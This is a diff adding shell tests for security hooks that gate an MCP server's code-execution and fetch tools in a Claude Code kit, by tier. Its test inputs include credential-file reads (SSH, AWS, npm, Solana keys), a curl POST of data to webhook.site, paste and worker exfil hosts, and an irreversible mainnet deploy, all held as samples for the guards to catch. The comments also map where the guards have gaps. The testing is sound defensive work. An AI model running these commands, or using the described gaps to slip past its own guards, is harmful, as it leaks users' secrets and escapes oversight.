@@ -337,4 +337,265 @@ else
   FAIL=$((FAIL + 1)); TOTAL=$((TOTAL + 1))
 fi
 
+# ===========================================================================
+# MCP gating: context-mode's executor and fetcher, through the same guards
+# ===========================================================================
+# `context-mode` ships in .mcp.json, so ctx_execute is an arbitrary executor that is on
+# by default. It runs outside the Bash tool AND outside the OS sandbox, so the hooks are
+# the only pattern layer in front of it and the tool-name denies are the only second
+# layer. Both are checked here.
+echo "[MCP: context-mode]"
+
+MCP_MATCHER='Bash|mcp__context-mode__.*'
+SETTINGS_MAIN="$REPO_ROOT/.claude/settings.json"
+M_SECRETS="$(hook "$SETTINGS_MAIN" PreToolUse 'secrets-guard')"
+M_CHAIN="$(hook "$SETTINGS_MAIN" PreToolUse 'onchain-guard')"
+M_EGRESS="$(hook "$SETTINGS_MAIN" PreToolUse 'egress-guard')"
+
+# Registration. A guard that is not routed MCP calls is the dangerous state, because the
+# scripts on disk are MCP-aware and the config looks finished.
+for FILE in "$REPO_ROOT/.claude/settings.json" "$REPO_ROOT/plugin/hooks/hooks.json"; do
+  NAME="${FILE#"$REPO_ROOT"/}"
+  UNROUTED="$(python3 - "$FILE" "$MCP_MATCHER" <<'PY'
+import json, sys
+path, want = sys.argv[1], sys.argv[2]
+bad = []
+for entry in json.load(open(path))["hooks"].get("PreToolUse", []):
+    m = entry.get("matcher") or ""
+    cmds = " ".join(h.get("command", "") for h in entry.get("hooks", []))
+    if not any(g in cmds for g in ("secrets-guard", "onchain-guard", "egress-guard")):
+        continue
+    if m != want:
+        bad.append(m or "(no matcher)")
+print(";".join(bad) or "ok")
+PY
+)"
+  assert_eq "ok" "$UNROUTED" "$NAME: every kit guard is registered for Bash and context-mode's MCP tools"
+done
+
+# run_mcp <hook-cmd> <tier> <tool> <tool_input-json> [project-dir] [headless]
+# Sets RC and DECISION (deny | ask | silent).
+run_mcp() {
+  local payload proj headless
+  proj="${5:-$REPO_ROOT}"
+  headless="${6:-0}"
+  payload="$(python3 -c '
+import json, sys
+print(json.dumps({"hook_event_name": "PreToolUse", "tool_name": sys.argv[1],
+                  "tool_input": json.loads(sys.argv[2])}))' "$3" "$4")"
+  set +e
+  OUT="$(cd "$WORK" && printf '%s' "$payload" | PATH="$WORK/bin:$PATH" \
+    CLAUDE_PROJECT_DIR="$proj" CLAUDE_PLUGIN_ROOT="$REPO_ROOT/plugin" \
+    KIT_FIREWALL_TIER="$2" KIT_FIREWALL_HEADLESS="$headless" sh -c "$1" 2>"$WORK/err")"
+  RC=$?
+  set -e
+  ERR="$(cat "$WORK/err")"
+  case "$OUT" in
+    *'"deny"'*) DECISION=deny ;;
+    *'"ask"'*)  DECISION=ask ;;
+    *)          DECISION=silent ;;
+  esac
+}
+
+# run_bash <hook-cmd> <tier> <command> — the same shape for the Bash equivalent, so the
+# two can be compared rather than asserted against a hand-written expectation.
+run_bash() {
+  local payload
+  payload="$(python3 -c '
+import json, sys
+print(json.dumps({"hook_event_name": "PreToolUse", "tool_name": "Bash",
+                  "tool_input": {"command": sys.argv[1]}}))' "$3")"
+  set +e
+  OUT="$(cd "$WORK" && printf '%s' "$payload" | PATH="$WORK/bin:$PATH" \
+    CLAUDE_PROJECT_DIR="$REPO_ROOT" CLAUDE_PLUGIN_ROOT="$REPO_ROOT/plugin" \
+    KIT_FIREWALL_TIER="$2" KIT_FIREWALL_HEADLESS=0 sh -c "$1" 2>"$WORK/err")"
+  RC=$?
+  set -e
+  case "$OUT" in
+    *'"deny"'*) DECISION=deny ;;
+    *'"ask"'*)  DECISION=ask ;;
+    *)          DECISION=silent ;;
+  esac
+}
+
+# --- Parity: the same payload through Bash and through ctx_execute must get the same
+# --- decision at the same tier. This is the property the gating exists to restore.
+SECRET_CMD='cat ~/.config/solana/id.json'
+DEPLOY_CMD='solana program deploy --url mainnet-beta ./t.so'
+for TIER in off relaxed medium high; do
+  run_bash "$M_SECRETS" "$TIER" "$SECRET_CMD"; B="$DECISION"
+  run_mcp "$M_SECRETS" "$TIER" mcp__context-mode__ctx_execute \
+    "$(python3 -c 'import json,sys; print(json.dumps({"language":"shell","code":sys.argv[1]}))' "$SECRET_CMD")"
+  assert_eq "$B" "$DECISION" "secret read: ctx_execute matches Bash at $TIER ($B)"
+
+  run_bash "$M_CHAIN" "$TIER" "$DEPLOY_CMD"; B="$DECISION"
+  run_mcp "$M_CHAIN" "$TIER" mcp__context-mode__ctx_execute \
+    "$(python3 -c 'import json,sys; print(json.dumps({"language":"shell","code":sys.argv[1]}))' "$DEPLOY_CMD")"
+  assert_eq "$B" "$DECISION" "mainnet deploy: ctx_execute matches Bash at $TIER ($B)"
+done
+
+# --- The irreversible set is deny at every tier, MCP included.
+for TIER in off relaxed medium high; do
+  run_mcp "$M_CHAIN" "$TIER" mcp__context-mode__ctx_execute \
+    '{"language":"shell","code":"solana program deploy --final ./t.so"}'
+  assert_eq "deny" "$DECISION" "ctx_execute carrying --final is denied at $TIER"
+done
+
+# --- Every shape the server offers, not just ctx_execute.
+run_mcp "$M_SECRETS" relaxed mcp__context-mode__ctx_batch_execute \
+  '{"commands":[{"label":"ok","command":"git status"},{"label":"bad","command":"cat ~/.ssh/id_rsa"}],"queries":["x"]}'
+assert_eq "deny" "$DECISION" "ctx_batch_execute: a secret read in a non-first commands[] entry is caught"
+run_mcp "$M_SECRETS" relaxed mcp__context-mode__ctx_execute_file \
+  '{"path":"/home/u/.ssh/id_rsa","language":"shell","code":"echo hi"}'
+assert_eq "deny" "$DECISION" "ctx_execute_file: a credential path argument is caught"
+run_mcp "$M_SECRETS" relaxed mcp__context-mode__ctx_index '{"path":"/home/u/.aws","source":"x"}'
+assert_eq "deny" "$DECISION" "ctx_index: a credential directory path is caught"
+# Non-shell code is foreign syntax; the credential still has to be found inside it.
+run_mcp "$M_SECRETS" relaxed mcp__context-mode__ctx_execute \
+  '{"language":"python","code":"print(open(\"/home/u/.aws/credentials\").read())"}'
+assert_eq "deny" "$DECISION" "ctx_execute: a credential path inside python code is caught"
+run_mcp "$M_SECRETS" relaxed mcp__context-mode__ctx_execute \
+  '{"language":"python","code":"print(open(\"/home/u/.npmrc\").read())"}'
+assert_eq "deny" "$DECISION" "ctx_execute: an end-anchored credential path inside python code is caught"
+run_mcp "$M_CHAIN" relaxed mcp__context-mode__ctx_execute \
+  '{"language":"python","code":"import os; os.system(\"solana program deploy --url mainnet-beta ./t.so\")"}'
+assert_eq "ask" "$DECISION" "ctx_execute: a mainnet shell-out from python code is gated"
+
+# --- No false positives. Prose fields are prose, and ordinary work stays silent.
+for G in "$M_SECRETS" "$M_CHAIN" "$M_EGRESS"; do
+  run_mcp "$G" relaxed mcp__context-mode__ctx_search \
+    '{"queries":["where do we cat ~/.ssh/id_rsa and solana program deploy --final"]}'
+  assert_eq "silent" "$DECISION" "ctx_search prose naming a credential and --final is not access to either"
+  run_mcp "$G" relaxed mcp__context-mode__ctx_execute \
+    '{"language":"shell","code":"cargo build --release","intent":"find ~/.ssh/id_rsa, solana program deploy --final"}'
+  assert_eq "silent" "$DECISION" "a credential named in intent next to benign code stays silent"
+done
+
+# --- Egress. deniedDomains is a syscall refusal for Bash and nothing at all for a local
+# --- MCP server, so here the hook is the enforcement. The list is read back out of the
+# --- generated settings.json, which is what makes it track the tier.
+# A complete install, not just a firewall.sh: the registered hook command resolves its
+# script under $CLAUDE_PROJECT_DIR, so a project with settings.json but no hooks/ makes
+# every guard exit 0 and every assertion below pass for the wrong reason.
+MCP_PROJ="$WORK/proj"
+mkdir -p "$MCP_PROJ/.claude/bin"
+cp "$REPO_ROOT/.claude/bin/firewall.sh" "$MCP_PROJ/.claude/bin/firewall.sh"
+cp -r "$REPO_ROOT/.claude/hooks" "$MCP_PROJ/.claude/hooks"
+for TIER in relaxed medium high; do
+  printf '{"tier":"%s"}\n' "$TIER" > "$MCP_PROJ/.claude/security.json"
+  printf '{}\n' > "$MCP_PROJ/.claude/settings.json"
+  (cd "$MCP_PROJ" && CLAUDE_PROJECT_DIR="$MCP_PROJ" bash .claude/bin/firewall.sh apply "$TIER" >/dev/null 2>&1) || true
+  # A base exfil sink: denied from Relaxed up.
+  run_mcp "$M_EGRESS" "$TIER" mcp__context-mode__ctx_fetch_and_index \
+    '{"url":"https://webhook.site/abc?leak=1"}' "$MCP_PROJ"
+  assert_eq "deny" "$DECISION" "ctx_fetch_and_index to an exfil sink is denied at $TIER"
+  # A Medium-and-up host: must NOT fire at Relaxed, where the tier does not deny it.
+  run_mcp "$M_EGRESS" "$TIER" mcp__context-mode__ctx_fetch_and_index \
+    '{"url":"https://x.workers.dev/p"}' "$MCP_PROJ"
+  if [ "$TIER" = relaxed ]; then
+    assert_eq "silent" "$DECISION" "ctx_fetch_and_index to *.workers.dev is allowed at relaxed (the tier does not deny it)"
+  else
+    assert_eq "deny" "$DECISION" "ctx_fetch_and_index to *.workers.dev is denied at $TIER"
+  fi
+done
+printf '{"tier":"off"}\n' > "$MCP_PROJ/.claude/security.json"
+printf '{}\n' > "$MCP_PROJ/.claude/settings.json"
+(cd "$MCP_PROJ" && CLAUDE_PROJECT_DIR="$MCP_PROJ" bash .claude/bin/firewall.sh apply off >/dev/null 2>&1) || true
+run_mcp "$M_EGRESS" off mcp__context-mode__ctx_fetch_and_index \
+  '{"url":"https://webhook.site/abc"}' "$MCP_PROJ"
+assert_eq "silent" "$DECISION" "Off generates no denylist, so the MCP egress gate is silent there too"
+
+# The domain gate reads the list out of settings.json, i.e. it follows the ENFORCED tier
+# on disk, not the KIT_FIREWALL_TIER override that moves the other two guards. That is
+# the right behaviour -- the hook enforces what is actually installed -- but it means the
+# project has to be regenerated here, not just relabelled. Asserted, so the coupling is
+# not mistaken for a bug later.
+printf '{"tier":"relaxed"}\n' > "$MCP_PROJ/.claude/security.json"
+printf '{}\n' > "$MCP_PROJ/.claude/settings.json"
+(cd "$MCP_PROJ" && CLAUDE_PROJECT_DIR="$MCP_PROJ" bash .claude/bin/firewall.sh apply relaxed >/dev/null 2>&1) || true
+run_mcp "$M_EGRESS" off mcp__context-mode__ctx_fetch_and_index \
+  '{"url":"https://webhook.site/abc"}' "$MCP_PROJ"
+assert_eq "silent" "$DECISION" "tier off short-circuits the gate even with a relaxed denylist on disk"
+# A URL inside executor code counts as egress, not only the fetcher's own field.
+run_mcp "$M_EGRESS" relaxed mcp__context-mode__ctx_execute \
+  '{"language":"shell","code":"curl -X POST -d @- https://webhook.site/x"}' "$MCP_PROJ"
+assert_eq "deny" "$DECISION" "a denied host inside ctx_execute code is caught too"
+# requests[] is the batch shape; the second entry must be seen.
+run_mcp "$M_EGRESS" relaxed mcp__context-mode__ctx_fetch_and_index \
+  '{"requests":[{"url":"https://example.com/a"},{"url":"https://p.pastebin.com/b"}],"concurrency":2}' "$MCP_PROJ"
+assert_eq "deny" "$DECISION" "ctx_fetch_and_index: a denied host in a non-first requests[] entry is caught"
+run_mcp "$M_EGRESS" relaxed mcp__context-mode__ctx_fetch_and_index \
+  '{"url":"https://docs.solana.com/"}' "$MCP_PROJ"
+assert_eq "silent" "$DECISION" "an ordinary docs URL is not gated"
+
+# --- Relaxed stays CI-safe. An `ask` is a hard failure under -p, so nothing new may ask
+# --- there headlessly, and nothing may newly deny what the Bash equivalent permits.
+for CASE in 'ctx_execute|{"language":"shell","code":"cargo build --release"}' \
+            'ctx_search|{"queries":["solana program deploy --final"]}' \
+            'ctx_execute|{"language":"shell","code":"anchor build"}' \
+            'ctx_fetch_and_index|{"url":"https://docs.rs/anchor-lang"}' \
+            'ctx_batch_execute|{"commands":[{"label":"a","command":"git status"}],"queries":["x"]}'; do
+  TOOL="mcp__context-mode__${CASE%%|*}"
+  INPUT="${CASE#*|}"
+  for G in "$M_SECRETS" "$M_CHAIN" "$M_EGRESS"; do
+    run_mcp "$G" relaxed "$TOOL" "$INPUT" "$REPO_ROOT" 1
+    assert_eq "silent|0" "$DECISION|$RC" "headless relaxed: $TOOL is silent for ordinary work"
+  done
+done
+# A devnet write asks interactively and must go quiet rather than fail a headless run.
+run_mcp "$M_CHAIN" relaxed mcp__context-mode__ctx_execute \
+  '{"language":"shell","code":"solana program deploy --url devnet ./t.so"}' "$REPO_ROOT" 1
+assert_eq "silent|0" "$DECISION|$RC" "headless relaxed: a devnet write goes quiet instead of asking"
+# Mainnet headless still refuses rather than slipping through, exactly as from Bash.
+run_mcp "$M_CHAIN" relaxed mcp__context-mode__ctx_execute \
+  '{"language":"shell","code":"solana program deploy --url mainnet-beta ./t.so"}' "$REPO_ROOT" 1
+assert_eq "deny" "$DECISION" "headless relaxed: a mainnet write through ctx_execute is refused, not skipped"
+
+# --- The second layer: tool-name denies at Medium and High only. A hook is one pattern
+# --- layer, and for MCP there is no sandbox underneath it, so the tiers that promise no
+# --- arbitrary executor have to refuse the tools outright.
+MCP_DENIED='mcp__context-mode__ctx_execute mcp__context-mode__ctx_execute_file mcp__context-mode__ctx_batch_execute mcp__context-mode__ctx_fetch_and_index mcp__context-mode__ctx_index'
+MCP_KEPT='mcp__context-mode__ctx_search mcp__context-mode__ctx_stats mcp__context-mode__ctx_doctor mcp__context-mode__ctx_purge mcp__context-mode__ctx_insight mcp__context-mode__ctx_upgrade'
+for TIER in off relaxed medium high; do
+  printf '{"tier":"%s"}\n' "$TIER" > "$MCP_PROJ/.claude/security.json"
+  printf '{}\n' > "$MCP_PROJ/.claude/settings.json"
+  (cd "$MCP_PROJ" && CLAUDE_PROJECT_DIR="$MCP_PROJ" bash .claude/bin/firewall.sh apply "$TIER" >/dev/null 2>&1) || true
+  DENY_LIST="$(python3 -c '
+import json, sys
+d = json.load(open(sys.argv[1]))
+print(" ".join((d.get("permissions") or {}).get("deny") or []))' "$MCP_PROJ/.claude/settings.json")"
+  for T in $MCP_DENIED; do
+    case " $DENY_LIST " in
+      *" $T "*) HAS=yes ;;
+      *)        HAS=no ;;
+    esac
+    if [ "$TIER" = medium ] || [ "$TIER" = high ]; then
+      assert_eq "yes" "$HAS" "$TIER denies $T by name"
+    else
+      assert_eq "no" "$HAS" "$TIER leaves $T callable (the hooks gate it there)"
+    fi
+  done
+  # The context-compression tools survive at every tier, or the server is pointless.
+  for T in $MCP_KEPT; do
+    case " $DENY_LIST " in
+      *" $T "*) HAS=yes ;;
+      *)        HAS=no ;;
+    esac
+    assert_eq "no" "$HAS" "$TIER keeps the read-only tool $T"
+  done
+done
+# A parenthesised mcp__ rule is SKIPPED when Claude Code loads a settings file, so an
+# argument filter there would look like a rule and be none. No tier may emit one.
+PARENS="$(python3 -c '
+import glob, json
+bad = []
+for path in [".claude/settings.json"]:
+    d = json.load(open(path))
+    for key in ("allow", "ask", "deny"):
+        for rule in (d.get("permissions") or {}).get(key) or []:
+            if rule.startswith("mcp__") and "(" in rule:
+                bad.append(rule)
+print(";".join(bad) or "ok")')"
+assert_eq "ok" "$PARENS" "no mcp__ permission rule carries parentheses (Claude Code skips those on load)"
+
 print_summary
